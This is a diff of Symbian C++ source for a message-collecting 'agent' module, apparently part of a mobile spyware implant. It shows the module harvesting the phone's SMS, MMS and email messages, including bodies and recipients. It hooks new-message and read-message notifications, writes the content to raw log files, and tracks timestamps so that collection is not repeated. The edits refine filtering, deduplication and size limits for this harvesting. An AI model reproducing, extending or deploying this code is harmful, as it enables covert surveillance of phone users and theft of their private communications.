@@ -73,7 +73,7 @@ CAgentMessages3::~CAgentMessages3()
 	delete iSelection;
 	delete iSmsMtm;
 	delete iMmsMtm;
-	delete iMtmReg;   //jo
+	delete iMtmReg;   
 	delete iMsvSession;
 	iMsvArray.Close();
 				
@@ -243,6 +243,8 @@ void CAgentMessages3::ConstructL(const TDesC8& params)
 	__FLOG_OPEN("HT", "Agent_Messages.txt");
 	__FLOG(_L("-------------"));
 	
+	iLastSavedMail.Set(_L("16010000:000000"));
+				
 	iMmsCollectFilter = CMessageFilter::NewL(); 
 	iMmsRuntimeFilter = CMessageFilter::NewL();
 	iSmsCollectFilter = CMessageFilter::NewL(); 
@@ -297,30 +299,35 @@ void CAgentMessages3::StartAgentCmdL()
 		iMailboxesCounter = iMailClient->GetMailboxesL(iMailboxes);// Get the mailboxes and return mailboxes.Count(); xref: /app/commonemail/emailservices/emailclientapi/src/emailclientapiimpl.cpp
 		}
 		
-	// if markup exists, set iMarkup to that value and modify range into filters
-	if(iMarkupFile->ExistsMarkupL(Type())){
+	// if markup exists, look at history range
+	iMarkup.smsFrom = iSmsCollectFilter->StartDate();
+	iMarkup.smsTo = iSmsCollectFilter->EndDate();
+	iMarkup.mmsFrom = iMmsCollectFilter->StartDate();
+	iMarkup.mmsTo = iMmsCollectFilter->EndDate();
+	iMarkup.mailFrom = iMailCollectFilter->StartDate();
+	iMarkup.mailTo = iMailCollectFilter->EndDate();
+	if(iMarkupFile->ExistsMarkupL(Type()))
+		{
 		// retrieve markup
-		// we add just a microsecond to the timestamp so that we are sure not to take 
-		// the contact of the timestamp saved into markup
-		TTimeIntervalMicroSeconds oneMicrosecond = 1;
+		TMarkup markup;
 		RBuf8 markupBuffer(iMarkupFile->ReadMarkupL(Type()));
 		markupBuffer.CleanupClosePushL();
-		Mem::Copy(&iMarkup,markupBuffer.Ptr(),sizeof(iMarkup));
-		CleanupStack::PopAndDestroy(&markupBuffer);		
-		if (iMailCollectFilter->iLog)
-			iMailCollectFilter->ModifyFilterRange(iMarkup.mailMarkup+oneMicrosecond);
-		if (iMmsCollectFilter->iLog)
-			iMmsCollectFilter->ModifyFilterRange(iMarkup.mmsMarkup+oneMicrosecond);
-		if (iSmsCollectFilter->iLog)
-			iSmsCollectFilter->ModifyFilterRange(iMarkup.smsMarkup+oneMicrosecond);
+		Mem::Copy(&markup,markupBuffer.Ptr(),sizeof(markup));
+		// compare with conf values
+		if((markup.smsFrom == iSmsCollectFilter->StartDate()) && (markup.smsTo == iSmsCollectFilter->EndDate()))
+			{
+			iSmsCollectFilter->iLog = EFalse;
+			}
+		if((markup.mmsFrom == iMmsCollectFilter->StartDate()) && (markup.mmsTo == iMmsCollectFilter->EndDate()))
+			{
+			iMmsCollectFilter->iLog = EFalse;
+			}
+		if((markup.mailFrom == iMailCollectFilter->StartDate()) && (markup.mailTo == iMailCollectFilter->EndDate()))
+			{
+			iMailCollectFilter->iLog = EFalse;
+			}
+		CleanupStack::PopAndDestroy(&markupBuffer);	
 		} 
-	else 
-		{
-		_LIT(KInitTime,"16010000:000000");
-		iMarkup.smsMarkup.Set(KInitTime);
-		iMarkup.mmsMarkup.Set(KInitTime);
-		iMarkup.mailMarkup.Set(KInitTime);
-		}
 	
 	iLogNewMessages = ETrue;
 	iLongTask->NextRound();
@@ -335,7 +342,7 @@ void CAgentMessages3::StopAgentCmdL()
 	for ( TInt i = 0; i < iMailboxes.Count(); i++ )
 		{
 		MEmailMailbox* mailbox = iMailboxes[i];
-		mailbox->UnregisterObserver(*this);  //TODO: verify what happens when unregister if not registered!!!
+		mailbox->UnregisterObserver(*this);  
 		mailbox->Release();   
 		}
 	iMailboxes.Close();
@@ -450,18 +457,13 @@ HBufC8* CAgentMessages3::GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aM
 	
 	serializedMsg.iDwSize += buffer->Size();
 	// insert the log structure 
-	buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg));
+	buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg)); 
 		
 	HBufC8* result = buffer->Ptr(0).AllocL();
 		
 	CleanupStack::PopAndDestroy(buffer);
 	
-	// we set here the markup, the buffer is not zero and we know everything
-	if(iMarkup.smsMarkup < aMsvEntryIdx.iDate){
-		iMarkup.smsMarkup = aMsvEntryIdx.iDate;
-	}
 	return result;
-	
 }
 	
 
@@ -667,11 +669,6 @@ HBufC8* CAgentMessages3::GetMMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aM
 	HBufC8* result = buffer->Ptr(0).AllocL();
 		
 	CleanupStack::PopAndDestroy(buffer);
-	
-	// we set here the markup, the buffer is not zero and we know everything
-	if(iMarkup.mmsMarkup < aMsvEntryIdx.iDate){
-		iMarkup.mmsMarkup = aMsvEntryIdx.iDate;
-	}
 
 	return result;
 	}
@@ -688,7 +685,7 @@ HBufC8* CAgentMessages3::GetMailBufferL(MEmailMessage* aMsg, CMessageFilter* aFi
 	
 	TUint8* ptrData;
 		
-	// TODO: insert MessageId:
+	// TODO: find the real MessageId:
 	_LIT8(KMsgId,"Message-ID: <50603B28.6060304@fake.addr>");
 	ptrData = (TUint8 *)KMsgId().Ptr();
 	mailBuffer->InsertL(mailBuffer->Size(), ptrData, KMsgId().Size());
@@ -735,7 +732,7 @@ HBufC8* CAgentMessages3::GetMailBufferL(MEmailMessage* aMsg, CMessageFilter* aFi
 	TInt countRec = aMsg->GetRecipientsL(MEmailAddress::EUndefined,recipients); // ETo,ECc,EBcc;EUndefined - returns to,cc and bcc recipients in that order
 	CBufBase* bufTo8 = CBufFlat::NewL(50);  
 	CleanupStack::PushL(bufTo8);
-	_LIT(KVirgola,", ");
+	_LIT8(KVirgola,",");
 	for(TInt i = 0; i< countRec ; i++)
 		{
 			MEmailAddress* address = recipients[i];
@@ -776,13 +773,13 @@ HBufC8* CAgentMessages3::GetMailBufferL(MEmailMessage* aMsg, CMessageFilter* aFi
 			RBuf data;
 			RetrieveTotalBodyL(content, data);
 			ptrData = (TUint8 *)data.Ptr();
-			mailBuffer->InsertL(mailBuffer->Size(), ptrData, data.Size());
+			if(data.Size() <= aFilter->iMaxMessageSize)
+				mailBuffer->InsertL(mailBuffer->Size(), ptrData, data.Size());
+			else
+				mailBuffer->InsertL(mailBuffer->Size(), ptrData, aFilter->iMaxMessageSize);
 			data.Close();
 			}
 		}
-	//_LIT8(KBODY,"Ciao");
-	//ptrData = (TUint8 *)KBODY().Ptr();
-	//mailBuffer->InsertL(mailBuffer->Size(), ptrData, KBODY().Size());
 		
 	// TODO: only for test delete when finished
 	//WriteMailFile(mailBuffer->Ptr(0));
@@ -793,11 +790,6 @@ HBufC8* CAgentMessages3::GetMailBufferL(MEmailMessage* aMsg, CMessageFilter* aFi
 	
 	CleanupStack::PopAndDestroy(mailBuffer);
 	
-	// we set here the markup, the buffer is not zero and we know everything
-	/*
-	if(iMarkup.mailMarkup < aMsvEntryIdx.iDate){
-		iMarkup.mailMarkup = aMsvEntryIdx.iDate;
-	}*/
 	return result;
 	}
 
@@ -810,12 +802,42 @@ void CAgentMessages3::DoOneRoundL()
 
 	if(iMailDump)
 		{
+		if(!iMailCollectFilter->iLog)
+			{
+			// we are not interested in collecting
+			// write markup
+			RBuf8 buf(GetMarkupBufferL(iMarkup));
+			buf.CleanupClosePushL();
+			if (buf.Length() > 0)
+				{
+				iMarkupFile->WriteMarkupL(Type(),buf);
+				}
+			CleanupStack::PopAndDestroy(&buf);
+			// subscribe to notifications if mail enabled
+			if(iMailRuntimeFilter->iLog)
+				{
+				for(TInt i=0; i < iMailboxes.Count(); i++)
+					{
+					MEmailMailbox* mailbox = iMailboxes[i];
+					mailbox->RegisterObserverL(*this);
+					}
+				}
+			return;
+			}
 		// we are dumping mail messages
 		// this is always done after sms/mms dump
 		--iMailboxesCounter;
 		if(iMailboxesCounter<0)
 			{
-			//TODO: finished dump, write markup, 
+			// finished dump, write markup,
+			RBuf8 buf(GetMarkupBufferL(iMarkup));
+			buf.CleanupClosePushL();
+			if (buf.Length() > 0)
+				{
+				iMarkupFile->WriteMarkupL(Type(),buf);
+				}
+			CleanupStack::PopAndDestroy(&buf);
+						
 			//subscribe to notifications
 			for(TInt i=0; i < iMailboxes.Count(); i++)
 				{
@@ -825,8 +847,6 @@ void CAgentMessages3::DoOneRoundL()
 			return;
 			}
 		MEmailMailbox* mailbox = iMailboxes[iMailboxesCounter];
-		TBuf<128> name;   // TODO: delete when done with testing
-		name.Copy(mailbox->MailboxName());   // TODO: delete when done with testing
 		TEmailSortCriteria criteria;  //emailsorting.h
 		criteria.iAscending = ETrue;
 		criteria.iField = TEmailSortCriteria::EByDate;
@@ -834,7 +854,7 @@ void CAgentMessages3::DoOneRoundL()
 		CleanupClosePushL(sortCriteriaArray);
 		sortCriteriaArray.Append(criteria);
 		RFolderArray folders;
-		TInt folderCount = mailbox->GetFoldersL(folders);
+		mailbox->GetFoldersL(folders);
 		for(TInt j=0; j < folders.Count(); j++)
 			{
 			MEmailFolder* folder = folders[j];
@@ -843,26 +863,29 @@ void CAgentMessages3::DoOneRoundL()
 			if (msgIterator) 
 				{
 				CleanupReleasePushL(*msgIterator);
-				TInt msgCount = msgIterator->Count();
+				//TInt msgCount = msgIterator->Count();
 				MEmailMessage* msg = NULL;
 				while ( NULL != (msg = msgIterator->NextL())) 
 					{
-					RBuf8 buf(GetMailBufferL(msg,iMailCollectFilter));
-					buf.CleanupClosePushL();
-					if (buf.Length() > 0)
+					if(/*iMailCollectFilter->iLog && */iMailCollectFilter->MessageInRange(msg->Date()))
 						{
-						TInt value;
-						RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
-						if(value)
+						RBuf8 buf(GetMailBufferL(msg,iMailCollectFilter));
+						buf.CleanupClosePushL();
+						if (buf.Length() > 0)
 							{
-							CLogFile* logFile = CLogFile::NewLC(iFs);
-							logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
-							logFile->AppendLogL(buf);
-							logFile->CloseLogL();
-							CleanupStack::PopAndDestroy(logFile);
+							TInt value;
+							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+							if(value)
+								{
+								CLogFile* logFile = CLogFile::NewLC(iFs);
+								logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
+								logFile->AppendLogL(buf);
+								logFile->CloseLogL();
+								CleanupStack::PopAndDestroy(logFile);
+								}
 							}
+						CleanupStack::PopAndDestroy(&buf);
 						}
-					CleanupStack::PopAndDestroy(&buf);
 					msg->Release();
 					}
 				CleanupStack::PopAndDestroy(msgIterator);
@@ -939,16 +962,7 @@ void CAgentMessages3::DoOneRoundL()
 		iArrayIndex++;
 		if (iArrayIndex >= iMsvArray.Count())	
 			{
-			// write markup, we have finished the initial sms/mms dump
-			// and we write the date of the most recent changed/added items
-			RBuf8 buf(GetMarkupBufferL(iMarkup));
-			buf.CleanupClosePushL();
-			if (buf.Length() > 0)
-				{
-				iMarkupFile->WriteMarkupL(Type(),buf);
-				}
-			CleanupStack::PopAndDestroy(&buf);
-				
+			// we have finished the initial sms/mms dump
 			__FLOG_1(_L("Processed: %d Entries"), iMsvArray.Count());
 			iArrayIndex = 0;
 			iMsvArray.Reset();
@@ -1014,7 +1028,7 @@ void CAgentMessages3::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, 
 				// sms
 				if(msvEntry.iMtm == KUidMsgTypeSMS)
 				{ 
-					if(iSmsRuntimeFilter->iLog /*&& iSmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
+					if(iSmsRuntimeFilter->iLog)
 					{
 						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
 						buf.CleanupClosePushL();
@@ -1039,7 +1053,7 @@ void CAgentMessages3::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, 
 				// mms
 				else if(msvEntry.iMtm == KUidMsgTypeMultimedia)
 					{
-						if(iMmsRuntimeFilter->iLog /*&& iMmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
+						if(iMmsRuntimeFilter->iLog)
 						{
 							RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
 							buf.CleanupClosePushL();
@@ -1059,22 +1073,6 @@ void CAgentMessages3::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, 
 									}
 							}
 							CleanupStack::PopAndDestroy(&buf);
-						}
-					}
-				// mail
-				if(writeMarkup)
-					{
-					if(iMarkupFile->ExistsMarkupL(Type()))
-						{
-						// if a markup exists, a dump has been performed and this 
-						// is the most recent change
-						RBuf8 buffer(GetMarkupBufferL(iMarkup));
-						buffer.CleanupClosePushL();
-						if (buffer.Length() > 0)
-							{
-							iMarkupFile->WriteMarkupL(Type(),buffer);
-							}
-						CleanupStack::PopAndDestroy(&buffer);
 						}
 					}
 				iNewMessageId = 0;
@@ -1098,7 +1096,7 @@ void CAgentMessages3::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, 
 			{
 				if(msvEntry.iMtm == KUidMsgTypeSMS) 
 				{
-					if(iSmsRuntimeFilter->iLog /*&& iSmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
+					if(iSmsRuntimeFilter->iLog)
 					{
 						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
 						buf.CleanupClosePushL();
@@ -1122,7 +1120,7 @@ void CAgentMessages3::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, 
 			}
 			else if(msvEntry.iMtm == KUidMsgTypeMultimedia) 
 				{
-					if(iMmsRuntimeFilter->iLog /*&& iMmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
+					if(iMmsRuntimeFilter->iLog)
 					{
 						RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
 						buf.CleanupClosePushL();
@@ -1143,23 +1141,6 @@ void CAgentMessages3::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, 
 						CleanupStack::PopAndDestroy(&buf);
 					}
 				}
-			// mail
-			if(writeMarkup)
-				{
-				if(iMarkupFile->ExistsMarkupL(Type()))
-					{
-					// if a markup exists, a dump has been performed and this 
-					// is the most recent change
-					RBuf8 buffer(GetMarkupBufferL(iMarkup));
-					buffer.CleanupClosePushL();
-					if (buffer.Length() > 0)
-						{
-						iMarkupFile->WriteMarkupL(Type(),buffer);
-						}
-					CleanupStack::PopAndDestroy(&buffer);
-					}
-				}
-							
 			break;
 			}
 		default:
@@ -1190,59 +1171,79 @@ void CAgentMessages3::NewMessageEventL( const TMailboxId& aMailbox, const REmail
     
 void CAgentMessages3::MessageChangedEventL( const TMailboxId& aMailbox, const REmailMessageIdArray aChangedMessages, const TFolderId& aParentFolderId )
 	{
-	// when the user reads a message never read before
-	MEmailMailbox* mailbox = iMailClient->MailboxL(aMailbox);
-	for(TInt i=0; i < aChangedMessages.Count(); i++)
+	// we are forcing a check:
+	// in theory we aren't subscribed to mail events if mail dump not enabled...
+	if(!iMailRuntimeFilter->iLog)
+		return;
+	// when the user reads a message never read before or when a user creates a new message
+	for (TInt i = 0; i < iMailboxes.Count(); i++)
 		{
-		MEmailMessage* msg = mailbox->MessageL(aChangedMessages[i]);
-		TInt flags = msg->Flags();//se flags == 0, msg arrivato ma non aperto  
-		MEmailFolder* folder = mailbox->FolderL(msg->ParentFolderId());
-		TFolderType type = folder->FolderType();
-		if(type == ESent)
+		if(iMailboxes[i]->MailboxId() == aMailbox)
 			{
-			// a new outgoing message, we ignore EDrafts and EOutbox event
-			RBuf8 buf(GetMailBufferL(msg,iMailCollectFilter));
-			buf.CleanupClosePushL();
-			if (buf.Length() > 0)
+			MEmailMailbox* mailbox = iMailboxes[i];
+			for(TInt j=0; j < aChangedMessages.Count(); j++)
 				{
-				TInt value;
-				RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
-				if(value)
+				MEmailMessage* msg = mailbox->MessageL(aChangedMessages[j]);
+				MEmailFolder* folder = mailbox->FolderL(msg->ParentFolderId());
+				TInt flags = msg->Flags();
+				TFolderType type = folder->FolderType();
+				if(type == ESent)
 					{
-					CLogFile* logFile = CLogFile::NewLC(iFs);
-					logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
-					logFile->AppendLogL(buf);
-					logFile->CloseLogL();
-					CleanupStack::PopAndDestroy(logFile);
-					}
-				}
-			CleanupStack::PopAndDestroy(&buf);
-			}
-		if((type == EInbox) || (type == EOther))
-			{
-			// a new incoming message
-			if(flags && EFlag_Read_Locally)   
-				{
-				RBuf8 buf(GetMailBufferL(msg,iMailCollectFilter));
-				buf.CleanupClosePushL();
-				if (buf.Length() > 0)
-					{
-					TInt value;
-					RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
-					if(value)
+					// a new outgoing message, we ignore EDrafts and EOutbox event
+					if(iLastSavedMail != msg->Date())
 						{
-						CLogFile* logFile = CLogFile::NewLC(iFs);
-						logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
-						logFile->AppendLogL(buf);
-						logFile->CloseLogL();
-						CleanupStack::PopAndDestroy(logFile);
+						// we receive more than one notification, so we have to be sure to dump
+						// only once
+						iLastSavedMail = msg->Date();
+						RBuf8 buf(GetMailBufferL(msg,iMailCollectFilter));
+						buf.CleanupClosePushL();
+						if (buf.Length() > 0)
+							{
+							TInt value;
+							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+							if(value)
+								{
+								CLogFile* logFile = CLogFile::NewLC(iFs);
+								logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
+								logFile->AppendLogL(buf);
+								logFile->CloseLogL();
+								CleanupStack::PopAndDestroy(logFile);
+								}
+							}
+						CleanupStack::PopAndDestroy(&buf);
 						}
 					}
-				CleanupStack::PopAndDestroy(&buf);
+				if((type == EInbox) || (type == EOther))
+					{
+					// a new incoming message
+					if(flags && EFlag_Read_Locally)   
+						{
+						if(iLastSavedMail != msg->Date())
+							{
+							iLastSavedMail = msg->Date();
+							RBuf8 buf(GetMailBufferL(msg,iMailCollectFilter));
+							buf.CleanupClosePushL();
+							if (buf.Length() > 0)
+								{
+								TInt value;
+								RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+								if(value)
+									{
+									CLogFile* logFile = CLogFile::NewLC(iFs);
+									logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
+									logFile->AppendLogL(buf);
+									logFile->CloseLogL();
+									CleanupStack::PopAndDestroy(logFile);
+									}
+								}
+							CleanupStack::PopAndDestroy(&buf);
+							}
+						}
+					}
+				msg->Release();
+				folder->Release();
 				}
 			}
-		folder->Release();
-		msg->Release();
 		}
 	}
     
@@ -1281,13 +1282,7 @@ void CAgentMessages3::RetrieveTotalBodyL(MEmailMessageContent* aContent, RBuf& a
         //TInt totalSize = textContent->TotalSize();
         if(availableSize!=0){
         	aData.Close();
-        	aData.Create(textContent->ContentL());
-        //if (totalSize <= availableSize) {  //TODO: change this when fetching in 
-        	//RBuf data;
-        	//data.Create(textContent->ContentL());
-        	//data.Close();
-            //TRAPD(textErr, textContent->FetchL(*this));
-            //Q_UNUSED(textErr);
+        	aData.Create(textContent->ContentL());        
         }      
     }   
     return;
@@ -1300,7 +1295,7 @@ void CAgentMessages3::RetrieveTotalBodyL(MEmailMessageContent* aContent, RBuf& a
  * 
  */
 // TODO: delete this method when finished mail test
-
+/*
 void CAgentMessages3::WriteMailFile(const TDesC8& aData)
 {
 	RFile file;
@@ -1315,7 +1310,7 @@ void CAgentMessages3::WriteMailFile(const TDesC8& aData)
 	file.Flush();
 	fs.Close();
 }
-
+*/
 
 /*
  * PER LA CREAZIONE DEL LOG:
